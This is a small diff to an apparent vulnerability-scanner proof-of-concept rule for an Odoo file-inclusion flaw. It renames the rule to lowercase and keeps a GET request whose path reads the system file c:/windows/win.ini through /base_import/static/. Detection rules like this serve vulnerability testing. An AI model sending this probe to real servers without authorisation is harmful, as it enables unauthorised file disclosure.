@@ -1,4 +1,4 @@
-name: poc-yaml-Odoo-file-inclusion
+name: poc-yaml-odoo-file-inclusion
 rules:
   - method: GET
     path: /base_import/static/c:/windows/win.ini
